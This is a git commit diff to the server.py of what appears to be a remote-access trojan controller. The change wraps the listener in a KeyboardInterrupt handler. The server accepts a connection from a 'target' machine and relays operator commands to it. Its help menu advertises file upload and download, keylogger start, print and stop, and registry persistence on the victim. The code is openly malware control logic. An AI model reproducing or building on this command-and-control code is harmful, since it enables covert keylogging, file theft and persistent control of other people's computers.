a9272235ee05b3519b299931779752e9398d0632
atz <joaocougia@gmail.com>
2021-02-25 15:06:51 -0300

    Add KeyboardInterrupt msg

--- server.py
+++ server.py
@@ -17,33 +17,37 @@ def reliable_rcv():
             continue
 
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 777))
-print(termcolor.colored("(#) LISTENING FOR INCOMING CONNECTIONS (#)", 'yellow'))
-sock.listen(5)
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('127.0.0.1', 777))
+    print(termcolor.colored("(#) LISTENING FOR INCOMING CONNECTIONS (#)", 'yellow'))
+    sock.listen(5)
 
 
-target, ip = sock.accept()
-print(termcolor.colored(f"(!) TARGET CONNECTED FROM {ip} (!)", 'green'))
-def target_communication():
-    while True:
-        command = input(f"(machine: {ip} >")
-        reliable_send(command)
-        if command == "quit":
-            print(termcolor.colored(f"(#) exiting {ip} machine (#)",  'yellow'))
-            break
-        elif command == "help":
-            print('''
-            quit ~ quit section
-            clear ~ clear screen
-            upload *file name* ~ upload file to target machine
-            download *file name* ~ download file from target machine
-            keylogger -s ~ start keylogger
-            keylloger -p ~ print inputed keys
-            keylogger -stop ~ stop keylogger
-            persistence *RegName* *FileName* ~ create register in registry''')
-        else:
-            result = reliable_rcv()
-            print(result)
-    
-target_communication()
+    target, ip = sock.accept()
+    print(termcolor.colored(f"(!) TARGET CONNECTED FROM {ip} (!)", 'green'))
+    def target_communication():
+        while True:
+            command = input(f"(machine: {ip} >")
+            reliable_send(command)
+            if command == "quit":
+                print(termcolor.colored(f"(#) exiting {ip} machine (#)",  'yellow'))
+                break
+            elif command == "help":
+                print('''
+                quit ~ quit section
+                clear ~ clear screen
+                upload *file name* ~ upload file to target machine
+                download *file name* ~ download file from target machine
+                keylogger -s ~ start keylogger
+                keylloger -p ~ print inputed keys
+                keylogger -stop ~ stop keylogger
+                persistence *RegName* *FileName* ~ create register in registry''')
+            else:
+                result = reliable_rcv()
+                print(result)
+        
+    target_communication()
+
+except KeyboardInterrupt:
+    print(termcolor.colored("(#) KeyboardInterrupt (#)", 'red'))
